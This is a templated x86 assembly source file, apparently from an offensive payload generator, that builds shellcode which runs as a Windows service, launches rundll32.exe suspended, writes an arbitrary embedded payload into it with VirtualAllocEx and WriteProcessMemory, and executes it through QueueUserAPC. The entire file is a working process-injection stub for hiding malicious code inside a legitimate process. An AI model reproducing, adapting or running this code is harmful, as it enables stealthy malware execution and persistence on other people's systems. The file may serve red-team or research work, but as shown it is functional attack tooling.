{% from 'macros.asm' import load_string %}
{% from 'macros.asm' import memset %}
{% from 'x86/block_api.asm' import api_call %}
{% from 'x86/block_api.asm' import api_define %}

{% set PAYLOAD_SIZE = payload | length %}
{#
    general flags
#}
{% set CONTEXT_FULL = 1048587 %}
{% set CREATE_SUSPENDED = 4 %}
{% set HEAP_ZERO_MEMORY = 8 %}
{% set MEM_COMMIT = 4096 %}
{% set MEM_RESERVE = 8192 %}
{% set SERVICE_ACCEPT_SHUTDOWN = 4 %}
{% set SERVICE_ACCEPT_STOP = 1 %}
{% set SERVICE_CONTROL_STOP = 1 %}
{% set SERVICE_CONTROL_SHUTDOWN = 5 %}
{% set SERVICE_RUNNING = 4 %}
{% set SERVICE_START_PENDING = 2 %}
{% set SERVICE_STOPPED = 1 %}
{% set SERVICE_WIN32_SHARE_PROCESS = 32 %}
{#
    data type sizes
#}
{% set sizeof_CONTEXT = 716            %}
{% set sizeof_DWORD = 4                %}
{% set sizeof_SERVICE_STATUS = 28      %}{# https://docs.microsoft.com/en-us/windows/desktop/api/winsvc/ns-winsvc-_service_status #}
{% set sizeof_STARTUPINFO = 68         %}
{% set sizeof_PTR = 4                  %}
{% set sizeof_PROCESS_INFORMATION = 16 %}

{% macro store_const(reg, value, offset=0, temp='eax') -%}
  mov {{ temp }}, {{ value }}
  mov [{{ reg }}{% if offset %} + {{ offset }}{% endif %}], {{ temp }}
{%- endmacro %}

_start:
  cld
  push ebp
  call main

{{ api_define() }}
main:
  pop ebp                                                   ; ebp = &apiStart
  {# uncomment the line below to include a 20-second sleep before executing the
   # main functionality, this provides the user with the opportunity to attach a
   # debugger to inspect the process #}
  {# api_call('kernel32.dll', 'Sleep', 20000) #}
  ; load advapi32.dll so it's available
  {{ load_string('advapi32.dll', register=None) }}
  {{ api_call('kernel32.dll', 'LoadLibraryA') }}
  ; allocate 16 bytes of space for SERVICE_TABLE_ENTRY
  sub esp, 0x10
  xor eax, eax                                              ; eax = 0
  mov [esp+0x0c], eax                                       ; pServiceTable[1]->lpServiceName = NULL
  mov [esp+0x08], eax                                       ; pServiceTable[1]->lpServiceProc = NULL
  call get_servicemain

  and esp, 0xfffffff0
  call servicemain
{{ api_define() }}
servicemain:
  pop ebp
  ; allocate space on the stack, layout looks like
  ; LPVOID               lpPayload                          ; destination for the payload
  ; LPVOID               lpStorage                          ; heap-storage for callback context information
  ; CONTEXT              Context                            ; thread context information
  ; STARTUPINFO          si                                 ; host process startup information
  ; PROCESS_INFORMATION  pi                                 ; host process information
  sub esp, 0x320                                            ; sizeof(CONTEXT) + sizeof(STARTUPINFO) + sizeof(PROCESS_INFORMATION)
  {{ memset('esp', 0, 800) }}
  {% set stkoff_ppay = 0 %}
  {% set stkoff_store = stkoff_ppay + sizeof_PTR %}
  {% set stkoff_ctx = stkoff_store + sizeof_PTR %}
  {% set stkoff_si = stkoff_ctx + sizeof_CONTEXT %}
  {% set stkoff_pi = stkoff_si + sizeof_STARTUPINFO + 8 %} {# plus 8 for alignment to a 16 boundary #}

  ; allocate space on the heap, layout looks like
  ; LPVOID               lpApiStart                         ; store a reference to the block api so it does not need to be included again
  ; LPVOID
  ; SERVICE_STATUS       serviceStatus
  {{ api_call('kernel32.dll', 'GetProcessHeap') }}
  {{ api_call('ntdll.dll', 'RtlAllocateHeap', 'eax', HEAP_ZERO_MEMORY, (sizeof_PTR * 2) + sizeof_SERVICE_STATUS) }}
  mov edi, eax
  {{ memset('edi', 0, (sizeof_PTR * 2) + sizeof_SERVICE_STATUS) }}

  mov [eax], ebp
  mov [esp + {{ stkoff_store }}], eax
  mov edi, eax

  ; si.cb = sizeof(STARTUPINFO)
  {{ store_const('esp', sizeof_STARTUPINFO, offset=stkoff_si) }}
  ; ss.dwServiceType = SERVICE_WIN32_SHARE_PROCESS
  {{ store_const('edi', SERVICE_WIN32_SHARE_PROCESS, offset=(sizeof_PTR * 2) + (sizeof_DWORD * 0)) }}
  ; ss.dwCurrentState = SERVICE_START_PENDING
  {{ store_const('edi', SERVICE_START_PENDING, offset=(sizeof_PTR * 2) + (sizeof_DWORD * 1)) }}
  ; ss.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN
  {{ store_const('edi', bw_or(SERVICE_ACCEPT_STOP, SERVICE_ACCEPT_SHUTDOWN), offset=(sizeof_PTR * 2) + (sizeof_DWORD * 2)) }}

  mov esi, esp                                                  ; esi = esp     ; set esi to the stack pointer to make offset calculations easier
  lea eax, [esi + {{ stkoff_pi }}]
  push eax                                                      ;                       (LPPROCESS_INFORMATION lpProcessInformation)
  lea eax, [esi + {{ stkoff_si }}]
  push eax                                                      ;                       (LPSTARTUPINFO lpStartupInfo)
  xor ecx, ecx                                                  ; ecx = NULL
  push ecx                                                      ; NULL                  (LPCSTR lpCurrentDirectory)
  push ecx                                                      ; NULL                  (LPVOID lpEnvironment)
  push {{ CREATE_SUSPENDED }}                                   ; CREATE_SUSPENDED      (DWORD dwCreationFlags)
  push ecx                                                      ; FALSE                 (BOOL bInheritHandles)
  push ecx                                                      ; NULL                  (LPSECURITY_ATTRIBUTES lpThreadAttributes)
  push ecx                                                      ; NULL                  (LPSECURITY_ATTRIBUTES lpProcessAttributes)
  {{ load_string('rundll32.exe', 'eax') }}                      ; eax = &"rundll32.exe" (LPCSTR lpCommandLine)
  push eax
  push ecx                                                      ; NULL                  (LPCSTR lpApplicationName)
  {{ api_call('kernel32.dll', 'CreateProcessA') }}
  mov ebx, eax

  xor ecx, ecx
  push ecx
  call get_servicehandler

servicehandler:
  push ebp
  mov ebp, esp
  push edi
  mov eax, [ebp + 0x08]                                         ; eax = dwControl (arg1)
  mov ecx, [ebp + 0x14]                                         ; edi = lpContext (arg4)
  mov ebp, [ecx]                                                ; ebp = &blockApi
  lea edi, [ecx + 0x08]                                         ; eax = &serviceStatus

  cmp eax, {{ SERVICE_CONTROL_STOP }}
  je _set_status
  cmp eax, {{ SERVICE_CONTROL_SHUTDOWN }}
  je _set_status
  jmp servicehandler_setstatus
_set_status:
  {{ store_const('edi', SERVICE_STOPPED, offset=4 * 1) }}       ; ss.dwCurrentState = SERVICE_STOPPED
  {{ store_const('edi', 0, offset=4 * 3) }}                     ; ss.dwWin32ExitCode = 0
servicehandler_setstatus:
  mov eax, [ecx + 0x04]                                         ; eax = hStatus
  {{ api_call('advapi32.dll', 'SetServiceStatus', 'eax', 'edi') }}
  pop edi
  pop ebp
  ret

get_servicehandler:
  call get_servicename
  push eax
  {{ api_call('advapi32.dll', 'RegisterServiceCtrlHandlerExA') }}

  mov edi, [esp + {{ stkoff_store }}]
  mov [edi + 0x4], eax                                          ; store hStatus from RegisterServiceCtrlHandlerExA
  cmp eax, 0
  je _servicemain_return

  lea edx, [edi + 0x8]                                          ; edx = &serviceStatus
  {{ store_const('edx', SERVICE_RUNNING, offset=4 * 1, temp='ecx') }}       ; ss.dwCurrentState = SERVICE_RUNNING
  {{ api_call('advapi32.dll', 'SetServiceStatus', arg1='eax', arg2='edx') }}

  cmp ebx, 0                                                    ; CreateProcessA == 0
  je _servicemain_exit

  lea edx, [esp + {{ stkoff_ctx }}]                             ; edx = &Context
  {{ store_const('edx', CONTEXT_FULL, offset=(4 * 6)) }}        ; Context.ContextFlags = CONTEXT_FULL
  mov ecx, [esp + {{ stkoff_pi + 4 }}]                          ; ecx = pi.hThread
  {{ api_call('kernel32.dll', 'GetThreadContext', arg1='ecx', arg2='edx') }}

  mov esi, esp
  push {{ permissions }}                                        ; PAGE_EXECUTE_READWRITE    (DWORD)  flProtect
  push {{ bw_or(MEM_COMMIT, MEM_RESERVE) }}                     ; MEM_COMMIT | MEM_RESERVE  (DWORD)  flAllocationType
  push {{ PAYLOAD_SIZE }}                                       ; dwSize                    (SIZE_T) dwSize
  push 0                                                        ; NULL                      (LPVOID) lpAddress
  mov eax, [esi + {{ stkoff_pi + 0 }}]                          ; eax = pi.hProcess
  push eax                                                      ; pi.hProcess               (HANDLE) hProcess
  {{ api_call('kernel32.dll', 'VirtualAllocEx') }}
  cmp eax, 0
  je _servicemain_close

  mov ebx, eax                                                  ; ebx = lpBaseAddress
  push 0                                                        ; NULL                      (SIZE_T)  *lpNumberOfBytesWritten
  push {{ PAYLOAD_SIZE }}                                       ; dwSize                    (SIZE_T)  nSize
  call get_payload
  push eax                                                      ; &pPayload                 (LPCVOID) lpBuffer
  push ebx                                                      ; lpBaseAddress             (LPVOID)  lpBaseAddress
  mov eax, [esi + {{ stkoff_pi + 0 }}]                          ; eax = pi.hProcess
  push eax                                                      ; pi.hProcess               (HANDLE)  hProcess
  {{ api_call('kernel32.dll', 'WriteProcessMemory') }}

  mov esi, esp
  push 0                                                        ; NULL                      ULONG_PTR dwData
  mov eax, [esi + {{ stkoff_pi + 4 }}]                          ; eax = pi.hThread
  push eax                                                      ; pi.hThread                (HANDLE)  hProcess
  push ebx                                                      ; lpBaseAddress             (LPVOID)  lpBaseAddress
  {{ api_call('kernel32.dll', 'QueueUserAPC') }}

_servicemain_close:
  mov eax, [esp + {{ stkoff_pi + 4 }}]                          ; eax = pi.hThread
  {{ api_call('kernel32.dll', 'ResumeThread', arg1='eax') }}
  mov eax, [esp + {{ stkoff_pi + 4 }}]                          ; eax = pi.hThread
  {{ api_call('kernel32.dll', 'CloseHandle', arg1='eax') }}
  mov eax, [esp + {{ stkoff_pi + 0 }}]                          ; eax = pi.hProcess
  {{ api_call('kernel32.dll', 'CloseHandle', arg1='eax') }}

_servicemain_exit:
  mov eax, [esp + {{ stkoff_store }}]
  push eax
  xor eax, eax
  push eax
  push eax
  push {{ SERVICE_CONTROL_STOP }}
  call servicehandler

  xor eax, eax
  push eax
  {{ api_call('kernel32.dll', 'ExitProcess') }}
_servicemain_return:
  add esp, 0x320
  ret

get_servicemain:
  pop eax
  mov [esp+0x04], eax                                           ; pServiceTable[1]->lpServiceProc = NULL

  call get_servicename
  mov [esp], eax                                                ; pServiceTable[0]->lpServiceName = NULL

  {{ api_call('advapi32.dll', 'StartServiceCtrlDispatcherA', arg1='esp') }}
  add esp, 0x10
  pop ebp
  ret

get_servicename:
  {{ load_string(service_name, 'eax') }}
  ret

; get the address of the payload to inject
get_payload:
  call _get_payload
  {% for source_line in raw_bytes(payload) %}
  {{ source_line.code }}
  {% endfor %}
  ret
_get_payload:
  pop eax
  ret